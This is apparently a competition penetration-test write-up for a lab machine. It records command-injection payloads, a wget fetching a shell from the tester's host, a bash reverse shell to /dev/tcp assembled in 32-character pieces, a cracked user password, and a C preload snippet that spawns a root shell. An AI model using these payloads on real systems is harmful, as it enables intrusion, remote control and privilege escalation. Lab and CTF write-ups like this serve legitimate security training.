<p align="center">NCIIPC-AICTE

<p align="center">Pentathon 2025

  

<p align="center">Vulnerability Assessment and Penetration Test Report

  

<p align="center">May 03, 2025

<p align="center">Name: Jay Shah

<p align="center">jayshah-551-SLI13</p>




Got the IP via netdiscover-

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd_uLVhB5HNYam-Ua2O9A6zxzshyemjfbkA10Rhgzy4noyxrNABy9EPtFcK6QvUPq_NpEWqGn4xbbGTdP-XMP8JmpwJBgjB5ZoP4b1rhTGG6PBDzK1JpYoNxH641px0uAdgjBga4Q?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Upon running an nmap scan, we get the following results -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc_hDpu7vrhhPTzIeijdrafUs3vwbCHIcuQc931B4SN4mLvpDI9GhI8qpsyFkq0hwHGk_qyres9rxvrCCtpWOHYLA8iM3mtX4fqGd6CmsqfC0yA25m7eKOWZ_CNiL6FTsBpr7YORA?key=DDFu3ZnUe63PYT0gtvO9EkZq)

On the web server, we see this -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf60H18MAFB_fYzXRACl-vCDfIm_CVh9MIbZBIgUzYLfV2j2ZrldXGH1HewghvW5tKhd3aamTnTaPLMXfbgj_izPYICqpVE5TGrQ48elUC1Ay9sz9HMXahHNwzSBxpvE1pAjzm8bQ?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Which conveniently tells us that it is a command injection vulnerability and needs to be under 32 characters.

After some testing, we have a PoC - t; id; t

Which reveals -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeZJ2aBZTwx7Q0Ur4JONgVhmFEGe4c-8ca0WmBGzE7w6zbvtKqt-fo5ATp9k1oOHrgB1dxJ4LKZ86NsPARR08V7CbXpp9UnwEG-wmWqEV_-PBUfDydqbEf6v_X-1qCP16p7N9ui?key=DDFu3ZnUe63PYT0gtvO9EkZq)

We are in /var/www/html so it should be easy to upload a shell payload by hosting it on my machine given the 32 character file limit.  
  
Upon entering this payload -

t; wget 192.168.230.132/shell; t  
  
We see the following get request made indicating it was successful-

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcTe7mTQyn67sMFNUHC-BU0v4qVeYBUqPBNLG9nOf1koboTnHYxbzulCYC9VubJTRKSiv-wb9Gzr8kLj7rG7zextmq1KLLQXMrZKJAJHklm8AYLRuMfBnpP7plcUJTYF1sIcv94?key=DDFu3ZnUe63PYT0gtvO9EkZq)

After this, it took quite a while since we are only able to write at /tmp destination. So with the limited number of characters I created the payload piece by piece as follows -

t;printf 'bash -i'>>/tmp/x;t

t;printf ' >& /de'>>/tmp/x;t

t;printf 'v/tcp/1'>>/tmp/x;t

t;printf '92.168.'>>/tmp/x;t

t;printf '230.132/49 '>>/tmp/x;t

t;printf '0>&1'>>/tmp/x;t

t;sh /tmp/x;t

And since sh here -

t;sh /tmp/x;t

 did not work, I used bash, and got the webshell -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdATbgwErSEi9frSq3cOZ4cOucnBqi29YmX3ETonjg1pAk_-2sjH50hGaUFeQZen08ANNKjrYYFQPy9E-_kvA5o31yk9-ZDniYLjz03fo77PLCshsjbvBm22AKWAa0223C-g3ZDqA?key=DDFu3ZnUe63PYT0gtvO9EkZq)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfG-ANDpaoz666GaRJWkQtWyC0OeaGdEvS370cUdvNzNGVjNFRUuqKY2iChWUUgLcivYP7D509MEXquXVxEz5ooix802LE9n_9V2N8GWl4Di1xXsOe1UgRYq93MXZRaSd1ueA-9Nw?key=DDFu3ZnUe63PYT0gtvO9EkZq)

And after traversing, we get the user flag -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcWX7TaSgIq1HU7zXcjI4bsjddubp96UnWRkWnSivm_pR4RIapAzYqNOg8Jvdu7pk-m1hXPIkgt3KtgWHUjhcvsbdZssOMNmiUIA6nEZ6ktNbNlrHranbvz2YqvM57kn05xN8DATQ?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Had also seen a passfile in /var/www -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf3gnnFRqz1w0ZoFz8wgR3sd6zbSXwW9eX8VuCTxDUkjFkoNbAyJ-wupuEXt0j7Izbiz--GqFOIjQDOEvzG2IALzQwBfGPseLgO_k-j7T2y6JAWVnSrfCegT0tvdD8R3SQ0xZQ0CQ?key=DDFu3ZnUe63PYT0gtvO9EkZq)

After trying some online decrypters for a while I switched to classic john and got the decrypted password for pumba user -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe3-yof7BEAcQh5TQlJb30xMKBqP0dLIL55FAkYGiVldySjprkSfdVFjb5SvHPeNC98D8w1yzvnE6p0JBo7_Duz1ECIQM86O1NtXsqAIwN_4cljZaRc20YBvXd9-KIYikRv4RC0EQ?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Username- pumba

Password - m33andshaiza

Now we ssh into it as pumba -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfqMOad8DQV9XM8fVnTBWGHGWAT8wdY7Oy7biNBfUoe9tCAI__usG2J67y_54LbjgWSFOx6t-o0byEs5roS5lqqAEl1JiUM4rDBDE-pwbeAFabBs4trZ25qJdcFRf1z3XnS-6RHCw?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Running linpeas.sh again  -

After looking for a while we struck gold -

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd7CRfFB9qI4bieN5RL_ILGrNsBeHvmNvVdJvyHoh0KLPsqHd1xuTfg_b-jM2a2DM1lNmeWmEAWi-HbFguA31KLHjcs1CFvG8H_WaZVz3HW3-J9XtBk92dbIuqV3cQ9riEaQ7hv?key=DDFu3ZnUe63PYT0gtvO9EkZq)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfGs3pxY5hFUUj-x8wN1bC6WeUZ0j4M3hw41-mRWdd6pm_J_UHr3igqJj-BHWWAqpYxSPJ5PWBNwqfmqiWRAAtAL8kVlxnOsTNH24pWDFIP67j3YOtVgoM0_2hJ49JkBpV48hRB?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Rootme.c -

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

void \_init() {

setuid(0); setgid(0);

system("/bin/bash");

}

And done! We are root-

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfJsYCQ0katTTEUNLIM7AwVusJ9qigMEyJxVCagLWE7-fsrEZiTzeXbQBlAbgvsHQTNo2s6rLIeuOlgB_JB4jNamhAVaEWjpkXhc1Uj5WkAKCUVaYR1rPds6gv3a7AqfPyNv0KelQ?key=DDFu3ZnUe63PYT0gtvO9EkZq)

Root flag listed.
